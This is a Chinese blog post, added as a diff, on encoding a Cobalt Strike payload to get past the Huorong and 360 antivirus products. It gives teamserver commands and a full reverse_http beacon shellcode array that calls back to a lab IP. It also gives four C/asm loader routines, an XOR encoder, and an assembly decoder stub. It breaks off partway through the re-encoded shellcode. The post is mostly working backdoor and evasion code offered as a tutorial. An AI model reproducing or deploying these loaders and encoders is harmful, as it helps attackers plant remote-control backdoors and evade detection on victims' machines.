@@ -1,0 +1,797 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="C语言,汇编语言,逆向,shellcode,免杀,cobalt strike,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="鸡肋，360加不加编码都安静如鸡。火绒静态动态加不加编码都查杀了。">
+<meta name="keywords" content="C语言,汇编语言,逆向,shellcode,免杀,cobalt strike">
+<meta property="og:type" content="article">
+<meta property="og:title" content="cobalt strike payload加编码">
+<meta property="og:url" content="http://yoursite.com/2020/02/25/cobalt-strike-payload加编码/index.html">
+<meta property="og:site_name" content="pukr&#39;s BLOG">
+<meta property="og:description" content="鸡肋，360加不加编码都安静如鸡。火绒静态动态加不加编码都查杀了。">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://yoursite.com/2020/02/25/cobalt-strike-payload加编码/登录cs.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/25/cobalt-strike-payload加编码/output.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/25/cobalt-strike-payload加编码/被杀.png">
+<meta property="og:updated_time" content="2020-03-29T15:43:05.196Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="cobalt strike payload加编码">
+<meta name="twitter:description" content="鸡肋，360加不加编码都安静如鸡。火绒静态动态加不加编码都查杀了。">
+<meta name="twitter:image" content="http://yoursite.com/2020/02/25/cobalt-strike-payload加编码/登录cs.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2020/02/25/cobalt-strike-payload加编码/">
+
+
+
+
+
+  <title>cobalt strike payload加编码 | pukr's BLOG</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">pukr's BLOG</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">人类的悲欢并不相通</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/25/cobalt-strike-payload加编码/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="尘林">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/zql.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="pukr's BLOG">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">cobalt strike payload加编码</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-25T15:52:06+08:00">
+                2020-02-25
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/基础训练/" itemprop="url" rel="index">
+                    <span itemprop="name">基础训练</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>鸡肋，360加不加编码都安静如鸡。火绒静态动态加不加编码都查杀了。<br><a id="more"></a><br><!--
+本文介绍利用cobalt strike生成的payload，在加编码后顺利逃过火绒、360的查杀。
+**环境：**
+**攻击机：Win10                        192.168.1.118**
+**目标机：Windows 2008 r2-1（火绒）   192.168.1.111**
+**目标机：Windows 2008 r2-2（360）    192.168.1.112**
+--></p>
+<h1 id="Cobalt-Strike启动"><a href="#Cobalt-Strike启动" class="headerlink" title="Cobalt Strike启动"></a>Cobalt Strike启动</h1><p>首先启动cobalt strike。在cs所在文件夹打开cmd，输入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">teamserver.bat 192.168.1.118 123456</span><br></pre></td></tr></table></figure></p>
+<p>然后打开cobaltstrike.bat，见到GUI界面。输入刚刚的ip和密码。<br><img src="/2020/02/25/cobalt-strike-payload加编码/登录cs.png" alt></p>
+<p>进入CS。</p>
+<h2 id="设置监听"><a href="#设置监听" class="headerlink" title="设置监听"></a>设置监听</h2><p>然后设置listener（监听器），输入listener的名字并选择listener类型，这里我们类型选择windows/beacon_http/reverse_http。并配置好主机IP和端口。</p>
+<h2 id="生成后门"><a href="#生成后门" class="headerlink" title="生成后门"></a>生成后门</h2><p>payload可以简单理解为可利用植入后门的代码。</p>
+<p>选择攻击-&gt;生成后门-&gt;payload generator<br>我们选择C形式输出，并选择之前设置好的监听器。<br><img src="/2020/02/25/cobalt-strike-payload加编码/output.png" alt></p>
+<p>生成了一串机器码作为shellcode。</p>
+<p>然后我们把它放到C程序里运行。</p>
+<h1 id="编译运行"><a href="#编译运行" class="headerlink" title="编译运行"></a>编译运行</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">#include &quot;stdio.h&quot;</span><br><span class="line">#include &quot;windows.h&quot;</span><br><span class="line"></span><br><span class="line">#pragma comment(linker,&quot;/section:.data,RWE&quot;)</span><br><span class="line"></span><br><span class="line">#pragma comment(linker,&quot;/subsystem:\&quot;windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;)</span><br><span class="line">#pragma comment(linker,&quot;/INCREMENTAL:NO&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">char shellcode[]=&quot;\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30\x8b\x52\x0c\x8b\x52&quot;</span><br><span class="line">&quot;\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1&quot;</span><br><span class="line">&quot;\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85&quot;</span><br><span class="line">&quot;\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b&quot;</span><br><span class="line">&quot;\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b&quot;</span><br><span class="line">&quot;\x7d\x24\x75\xe2\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b&quot;</span><br><span class="line">&quot;\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b&quot;</span><br><span class="line">&quot;\x12\xeb\x86\x5d\x68\x6e\x65\x74\x00\x68\x77\x69\x6e\x69\x54\x68\x4c\x77\x26\x07&quot;</span><br><span class="line">&quot;\xff\xd5\x31\xff\x57\x57\x57\x57\x57\x68\x3a\x56\x79\xa7\xff\xd5\xe9\x84\x00\x00&quot;</span><br><span class="line">&quot;\x00\x5b\x31\xc9\x51\x51\x6a\x03\x51\x51\x68\xb3\x15\x00\x00\x53\x50\x68\x57\x89&quot;</span><br><span class="line">&quot;\x9f\xc6\xff\xd5\xeb\x70\x5b\x31\xd2\x52\x68\x00\x02\x40\x84\x52\x52\x52\x53\x52&quot;</span><br><span class="line">&quot;\x50\x68\xeb\x55\x2e\x3b\xff\xd5\x89\xc6\x83\xc3\x50\x31\xff\x57\x57\x6a\xff\x53&quot;</span><br><span class="line">&quot;\x56\x68\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x84\xc3\x01\x00\x00\x31\xff\x85\xf6&quot;</span><br><span class="line">&quot;\x74\x04\x89\xf9\xeb\x09\x68\xaa\xc5\xe2\x5d\xff\xd5\x89\xc1\x68\x45\x21\x5e\x31&quot;</span><br><span class="line">&quot;\xff\xd5\x31\xff\x57\x6a\x07\x51\x56\x50\x68\xb7\x57\xe0\x0b\xff\xd5\xbf\x00\x2f&quot;</span><br><span class="line">&quot;\x00\x00\x39\xc7\x74\xb7\x31\xff\xe9\x91\x01\x00\x00\xe9\xc9\x01\x00\x00\xe8\x8b&quot;</span><br><span class="line">&quot;\xff\xff\xff\x2f\x76\x4e\x57\x41\x00\xa4\x82\x36\xe9\x5d\x2f\x17\x46\xa9\xa8\xdc&quot;</span><br><span class="line">&quot;\x28\x7a\xd2\x31\xae\x57\xfd\x83\x4b\x56\x0a\x61\x21\xa3\xbc\x95\x56\x1f\x8f\xce&quot;</span><br><span class="line">&quot;\x30\xb8\x70\x02\x62\x4c\x92\x8f\x98\x74\xce\x72\xa5\xf3\x98\xab\x0b\xcb\xc3\x00&quot;</span><br><span class="line">&quot;\x1c\x6e\xd0\x04\xfc\x44\x81\x2f\x00\x8c\xc0\x56\x7a\x9d\x47\x8f\x3b\x24\x55\x6a&quot;</span><br><span class="line">&quot;\xbb\x20\x00\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c&quot;</span><br><span class="line">&quot;\x6c\x61\x2f\x34\x2e\x30\x20\x28\x63\x6f\x6d\x70\x61\x74\x69\x62\x6c\x65\x3b\x20&quot;</span><br><span class="line">&quot;\x4d\x53\x49\x45\x20\x38\x2e\x30\x3b\x20\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54&quot;</span><br><span class="line">&quot;\x20\x36\x2e\x30\x3b\x20\x54\x72\x69\x64\x65\x6e\x74\x2f\x34\x2e\x30\x29\x0d\x0a&quot;</span><br><span class="line">&quot;\x00\xd8\xd7\x51\xc4\x66\xd3\xb8\x15\xce\xc6\xa1\x78\xaf\x55\x52\x13\xbb\x4f\x2c&quot;</span><br><span class="line">&quot;\xd6\xe6\x00\x67\x91\x12\xd8\x7f\xe0\x71\x8b\x6d\x8b\x43\x4d\x10\xc0\xe9\x93\x66&quot;</span><br><span class="line">&quot;\x8e\x31\xe6\xb9\x32\x80\x75\x1c\xef\xca\x4a\xaa\x94\x14\x30\x21\x08\x3a\xab\x3d&quot;</span><br><span class="line">&quot;\xc2\xe1\xc4\x47\x13\x18\xa3\xf5\xad\x51\x6a\xa8\x93\x08\x49\x98\x16\x54\xac\x81&quot;</span><br><span class="line">&quot;\xbb\xbe\xf8\x71\xe3\x6a\x2a\xf5\xa6\x85\xf9\x9f\xdc\x69\x6c\x20\x93\x9b\xda\x07&quot;</span><br><span class="line">&quot;\x28\x15\xb2\x14\x2c\xfc\x55\xb8\x87\x7b\x64\xd6\xa1\x4e\xaf\x6a\x76\x2e\x74\x2e&quot;</span><br><span class="line">&quot;\x8f\x62\xda\xe5\x98\xa0\x88\xe2\x6f\xb0\xd2\xa5\x25\xe5\x4a\xa6\x44\x16\x92\x94&quot;</span><br><span class="line">&quot;\x19\x81\x3b\x72\x11\xde\x98\x65\xae\xb5\x68\xd9\xcc\x65\xb8\x86\x0d\x78\x91\x7f&quot;</span><br><span class="line">&quot;\xf9\x14\xe5\xf3\xc6\x37\x75\x76\xf8\xfc\x85\xa9\xa1\xa0\x5a\xa1\x14\x39\x57\x30&quot;</span><br><span class="line">&quot;\xa0\xec\x44\xd8\x1e\xcb\xc8\xe2\xa7\x71\x24\xbe\x3a\x18\xe0\xb1\x5d\x51\x75\x0e&quot;</span><br><span class="line">&quot;\xc4\x53\x22\x6e\xca\x51\x51\x61\x57\x5a\x1d\x38\x65\x03\x1e\xa7\xcc\x23\xcf\x14&quot;</span><br><span class="line">&quot;\xf3\x85\x52\xec\x80\x11\x00\x68\xf0\xb5\xa2\x56\xff\xd5\x6a\x40\x68\x00\x10\x00&quot;</span><br><span class="line">&quot;\x00\x68\x00\x00\x40\x00\x57\x68\x58\xa4\x53\xe5\xff\xd5\x93\xb9\x00\x00\x00\x00&quot;</span><br><span class="line">&quot;\x01\xd9\x51\x53\x89\xe7\x57\x68\x00\x20\x00\x00\x53\x56\x68\x12\x96\x89\xe2\xff&quot;</span><br><span class="line">&quot;\xd5\x85\xc0\x74\xc6\x8b\x07\x01\xc3\x85\xc0\x75\xe5\x58\xc3\xe8\xa9\xfd\xff\xff&quot;</span><br><span class="line">&quot;\x31\x39\x32\x2e\x31\x36\x38\x2e\x31\x2e\x31\x31\x38\x00\x6f\xaa\x51\xc3&quot;;</span><br><span class="line"></span><br><span class="line">void run1()&#123;</span><br><span class="line">	((void(*)(void))&amp;shellcode)();</span><br><span class="line">&#125;</span><br><span class="line">void run2()&#123;</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">		lea eax,shellcode</span><br><span class="line">		jmp eax</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">void run3()&#123;</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">	  mov eax,offset shellcode</span><br><span class="line">	  jmp eax</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">void run4()&#123;</span><br><span class="line">__asm</span><br><span class="line">	&#123;</span><br><span class="line">	  mov eax,offset shellcode</span><br><span class="line">	  _emit 0xFF</span><br><span class="line">	  _emit 0xE0</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">void main()</span><br><span class="line">&#123;</span><br><span class="line">	run2();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以用我上一篇文章提到的几种加载shellcode的方式，这里提供了4种。</p>
+<p>然后编译组建……嗯，被杀了。</p>
+<p><img src="/2020/02/25/cobalt-strike-payload加编码/被杀.png" alt></p>
+<p>尝试编码，或许可以逃过被杀。</p>
+<h1 id="装饰shellcode"><a href="#装饰shellcode" class="headerlink" title="装饰shellcode"></a>装饰shellcode</h1><h2 id="异或编码"><a href="#异或编码" class="headerlink" title="异或编码"></a>异或编码</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;string.h&gt;</span><br><span class="line">#include&lt;stdlib.h&gt;</span><br><span class="line">void encoder(char *input,unsigned char key,int display_flag)</span><br><span class="line">&#123;</span><br><span class="line">	int i=0,len=0;</span><br><span class="line">	FILE *fp;</span><br><span class="line">	unsigned char *output;</span><br><span class="line">	len = strlen(input);</span><br><span class="line">	printf(&quot;%d\n&quot;,len);</span><br><span class="line">	output = (unsigned char *)malloc(len+1);</span><br><span class="line">	if(!output)</span><br><span class="line">	&#123;</span><br><span class="line">		printf(&quot;memory error\n&quot;);</span><br><span class="line">		exit(0);	</span><br><span class="line">	&#125;</span><br><span class="line">	//encode the shellcode</span><br><span class="line">	for(i=0;i&lt;len;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		output[i] = input[i]^key;</span><br><span class="line">	&#125;</span><br><span class="line">	if(!(fp=fopen(&quot;encode.txt&quot;,&quot;w+&quot;)))</span><br><span class="line">	&#123;</span><br><span class="line">		printf(&quot;output file creat error\n&quot;);</span><br><span class="line">		exit(0);	</span><br><span class="line">	&#125;</span><br><span class="line">	fprintf(fp,&quot;\&quot;&quot;);</span><br><span class="line">	for(i=0;i&lt;len;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		fprintf(fp,&quot;\\x%0.2x&quot;,output[i]);</span><br><span class="line">		if((i+1)%16 == 0)</span><br><span class="line">		&#123;</span><br><span class="line">			fprintf(fp,&quot;\&quot;\n\&quot;&quot;);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	fprintf(fp,&quot;\&quot;;&quot;);</span><br><span class="line">	fclose(fp);</span><br><span class="line">	printf(&quot;dump the encoded shellcode to encode.txt OK!\n&quot;);</span><br><span class="line">	if(display_flag)//print to screen</span><br><span class="line">	&#123;</span><br><span class="line">		for(i=0;i&lt;len;i++)</span><br><span class="line">		&#123;</span><br><span class="line">			printf(&quot;%0.2x &quot;,output[i]);</span><br><span class="line">			if((i+1)%16 == 0)</span><br><span class="line">			&#123;</span><br><span class="line">				printf(&quot;\n&quot;);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	free(output);</span><br><span class="line">&#125;</span><br><span class="line">void main()&#123;</span><br><span class="line">char *input=&quot;  &quot;;</span><br><span class="line">encoder(input,0x44,1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>编码程序有个缺陷，就是用到了strlen函数来统计字符数。这样就会造成编码前的字符不能有\x00。所以先替换掉这些00，编码完后再换成编码字符，再次异或就回到00了。</p>
+<h2 id="解码"><a href="#解码" class="headerlink" title="解码"></a>解码</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">void main()&#123;</span><br><span class="line">	__asm&#123;</span><br><span class="line">		add eax,0x14               //最开始是add eax,0x14，就是跳过解码部分的代码，寄存器指向编码后的shellcode。这样就定位了shellcode</span><br><span class="line">		xor ecx,ecx                //把ecx作为计数器</span><br><span class="line">decode:</span><br><span class="line">		mov bl,byte ptr [eax+ecx]  //byte ptr [eax+ecx]实现以字节计的每次移动一个字节解码</span><br><span class="line">		xor bl,0x44                //一个字节8位，每次解码一个，所以安排在了ebx低8位bl寄存器中</span><br><span class="line">		mov byte ptr [eax+ecx],bl</span><br><span class="line">		inc ecx</span><br><span class="line">		cmp bl,0x90                //最后设置一个0x90作为结束标志，要是bl的值和0x90解码后相同了就结束解码部分，开始执行后面已经解码的指令</span><br><span class="line">		jne decode</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>提取出机器码，放到shellcode开头。</p>
+<h2 id="装饰完毕"><a href="#装饰完毕" class="headerlink" title="装饰完毕"></a>装饰完毕</h2><p>编码一次</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line">#include &quot;stdio.h&quot;</span><br><span class="line"></span><br><span class="line">#include &quot;windows.h&quot;</span><br><span class="line"></span><br><span class="line">#pragma comment(linker,&quot;/section:.data,RWE&quot;)</span><br><span class="line"></span><br><span class="line">#pragma comment(linker,&quot;/subsystem:\&quot;windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;)</span><br><span class="line"></span><br><span class="line">#pragma comment(linker,&quot;/INCREMENTAL:NO&quot;)</span><br><span class="line"></span><br><span class="line">char shellcode[]=&quot;\x83\xc0\x14\x33\xc9\x8a\x1c\x08\x80\xf3\x99\x88\x1c\x08\x41\x80\xfb\x90\x75\xf1&quot;</span><br><span class="line">&quot;\x65\x71\x10\x99\x99\x99\xf9\x10\x7c\xa8\x4b\xfd\x12\xcb\xa9\x12&quot;</span><br><span class="line">&quot;\xcb\x95\x12\xcb\x8d\x12\xeb\xb1\x96\x2e\xd3\xbf\xa8\x66\xa8\x59&quot;</span><br><span class="line">&quot;\x35\xa5\xf8\xe5\x9b\xb5\xb9\x58\x56\x94\x98\x5e\x7b\x69\xcb\xce&quot;</span><br><span class="line">&quot;\x12\xcb\x89\x12\xdb\xa5\x98\x49\x12\xd9\xe1\x1c\x59\xed\xd3\x98&quot;</span><br><span class="line">&quot;\x49\xc9\x12\xd1\x81\x12\xc1\xb9\x98\x4a\x7a\xa5\xd0\x12\xad\x12&quot;</span><br><span class="line">&quot;\x98\x4f\xa8\x66\xa8\x59\x35\x58\x56\x94\x98\x5e\xa1\x79\xec\x6d&quot;</span><br><span class="line">&quot;\x9a\xe4\x61\xa2\xe4\xbd\xec\x7b\xc1\x12\xc1\xbd\x98\x4a\xff\x12&quot;</span><br><span class="line">&quot;\x95\xd2\x12\xc1\x85\x98\x4a\x12\x9d\x12\x98\x49\x10\xdd\xbd\xbd&quot;</span><br><span class="line">&quot;\xc2\xc2\xf8\xc0\xc3\xc8\x66\x79\xc1\xc6\xc3\x12\x8b\x72\x1f\xc4&quot;</span><br><span class="line">&quot;\xf1\xf7\xfc\xed\x99\xf1\xee\xf0\xf7\xf0\xcd\xf1\xd5\xee\xbf\x9e&quot;</span><br><span class="line">&quot;\x66\x4c\xa8\x66\xce\xce\xce\xce\xce\xf1\xa3\xcf\xe0\x3e\x66\x4c&quot;</span><br><span class="line">&quot;\x70\x1d\x99\x99\x99\xc2\xa8\x50\xc8\xc8\xf3\x9a\xc8\xc8\xf1\x2a&quot;</span><br><span 